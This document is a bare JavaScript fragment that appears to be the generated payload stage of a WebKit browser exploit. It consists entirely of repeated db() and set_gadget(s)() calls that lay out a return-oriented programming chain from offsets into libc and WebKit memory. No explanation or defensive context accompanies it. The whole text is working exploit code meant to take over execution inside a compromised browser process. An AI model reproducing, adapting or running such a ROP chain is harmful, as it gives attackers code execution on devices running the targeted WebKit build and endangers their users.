db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+130056,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+130160,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+130176,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+130312,
webkit_base+7438103,
libc_base+793877,
ropchain+130328,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+130296,
webkit_base+7438103,
libc_base+793877
]);

db([12, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+130416,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+130432,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+130584,
webkit_base+7438103,
libc_base+793877,
ropchain+130616,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+130568,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+130600,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+130728,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+130696,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967295, 4294967295]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+130816,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+130920,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+130936,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+131040,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+131024,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+131096,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([12, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+131272,
webkit_base+7438103,
libc_base+793877,
ropchain+131288,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+131256,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+131408,
webkit_base+7438103,
libc_base+793877,
ropchain+131424,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+131392,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+8824269,
libc_base+269973,
libc_base+793877,
ropchain+131592,
webkit_base+7438103,
libc_base+793877,
ropchain+131608,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+131576,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+131712,
webkit_base+7438103,
libc_base+793877,
ropchain+131776,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+131728,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+389047,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+131896,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+131888,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+131912,
ropchain+136032,
libc_base+793877,
ropchain+131952,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+132056,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+132072,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+132208,
webkit_base+7438103,
libc_base+793877,
ropchain+132224,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+132192,
webkit_base+7438103,
libc_base+793877
]);

db([36, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+132312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+132328,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+132480,
webkit_base+7438103,
libc_base+793877,
ropchain+132512,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+132464,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+132496,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+132584,
webkit_base+7438103,
libc_base+793877,
ropchain+132600,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+132696,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+132680,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+132776,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+132880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+132896,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+133032,
webkit_base+7438103,
libc_base+793877,
ropchain+133048,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+133016,
webkit_base+7438103,
libc_base+793877
]);

db([12, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+133136,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+133152,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+133304,
webkit_base+7438103,
libc_base+793877,
ropchain+133336,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+133288,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+133320,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+133408,
webkit_base+7438103,
libc_base+793877,
ropchain+133424,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+133544,
webkit_base+7438103,
libc_base+793877,
ropchain+133560,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+133528,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+8824269,
libc_base+269973,
libc_base+793877,
ropchain+133728,
webkit_base+7438103,
libc_base+793877,
ropchain+133744,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+133712,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+133848,
webkit_base+7438103,
libc_base+793877,
ropchain+133912,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+133864,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+134024,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+134016,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+134040,
ropchain+135672,
libc_base+793877,
ropchain+134080,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+134184,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+134200,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+134352,
webkit_base+7438103,
libc_base+793877,
ropchain+134384,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+134336,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+134368,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+134456,
webkit_base+7438103,
libc_base+793877,
ropchain+134472,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+134632,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+134584,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+134600,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+134688,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+134792,
webkit_base+7438103,
libc_base+793877,
ropchain+134824,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+134808,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+134896,
webkit_base+7438103,
libc_base+793877,
ropchain+134912,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+135008,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+134992,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+135088,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([10, 0]);
set_gadget(libc_base+788575,);

db([10, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+135240,
webkit_base+7438103,
libc_base+793877,
ropchain+135256,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+135224,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
libc_base+389047,
libc_base+269973,
libc_base+793877,
ropchain+135424,
webkit_base+7438103,
libc_base+793877,
ropchain+135440,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+135408,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+135576,
webkit_base+7438103,
libc_base+793877,
ropchain+135592,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+135544,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+389047,
libc_base+269973,
libc_base+793877,
ropchain+135664,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+882884,
libc_base+793877,
ropchain+135784,
webkit_base+7438103,
libc_base+793877,
ropchain+135800,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+135768,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+135936,
webkit_base+7438103,
libc_base+793877,
ropchain+135952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+135904,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+389047,
libc_base+269973,
libc_base+793877,
ropchain+136024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+882884,
libc_base+793877,
ropchain+136144,
webkit_base+7438103,
libc_base+793877,
ropchain+136160,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+136128,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+136264,
webkit_base+7438103,
libc_base+793877,
ropchain+136312,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+136280,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+136424,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+136416,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+136440,
ropchain+138736,
libc_base+793877,
ropchain+136480,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+136584,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+136600,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+136752,
webkit_base+7438103,
libc_base+793877,
ropchain+136784,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+136736,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+136768,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+136856,
webkit_base+7438103,
libc_base+793877,
ropchain+136872,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+137032,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+136984,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+137000,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([56, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+137136,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+137120,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+137216,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+137320,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+137336,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+137408,
webkit_base+7438103,
libc_base+793877,
ropchain+137424,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+137568,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+137536,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+137552,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+137656,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+137744,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+137848,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+137864,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+137968,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+137952,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+138024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+138144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+138200,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+138344,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+138312,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([56, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+138472,
webkit_base+7438103,
libc_base+793877,
ropchain+138488,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+138456,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+138584,
webkit_base+7438103,
libc_base+793877,
ropchain+138600,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+138712,
webkit_base+7438103,
libc_base+793877,
ropchain+138696,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+811575,
ropchain+140144,

libc_base+793877,
ropchain+138776,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+138880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+138896,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+139040,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+139008,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+139024,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+139120,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+139224,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+139240,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+139392,
webkit_base+7438103,
libc_base+793877,
ropchain+139424,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+139376,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+139408,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+139520,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+139504,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+139624,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+140456,

libc_base+882884,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+139760,
webkit_base+7438103,
libc_base+793877,
ropchain+139776,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+139744,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+139896,
webkit_base+7438103,
libc_base+793877,
ropchain+139912,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+139880,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+140008,
webkit_base+7438103,
libc_base+793877,
ropchain+140024,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+140136,
webkit_base+7438103,
libc_base+793877,
ropchain+140120,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadgets([
libc_base+793877,
ropchain+140224,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+140208,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+140320,
webkit_base+7438103,
libc_base+793877,
ropchain+140336,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+140448,
webkit_base+7438103,
libc_base+793877,
ropchain+140432,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
